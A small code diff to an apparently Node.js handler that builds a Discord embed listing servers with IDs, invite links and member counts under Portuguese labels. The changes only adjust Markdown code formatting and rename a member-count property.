@@ -32,7 +32,7 @@ module.exports = async (req, res) => {
     const servers = await Promise.all(
       guilds.map(async (guild) => {
         const invite = await getServerInvite(guild.id, token);
-        return `${guild.name} - ${guild.id}\n[Link](${invite}) - ${guild.memberCount} Membros`;
+        return `\`${guild.name} - ${guild.id}\`\n[Link](${invite}) - \`${guild.membersCount} Membros\``;
       }));
 
     const embed = {
@@ -55,7 +55,7 @@ module.exports = async (req, res) => {
           },
           {
             name: 'Servidores',
-            value: `\`${servers.join('\n\n') || 'Nenhum'}\``,
+            value: `${servers.join('\n\n') || 'Nenhum'}`,
             inline: false
           }
         ],
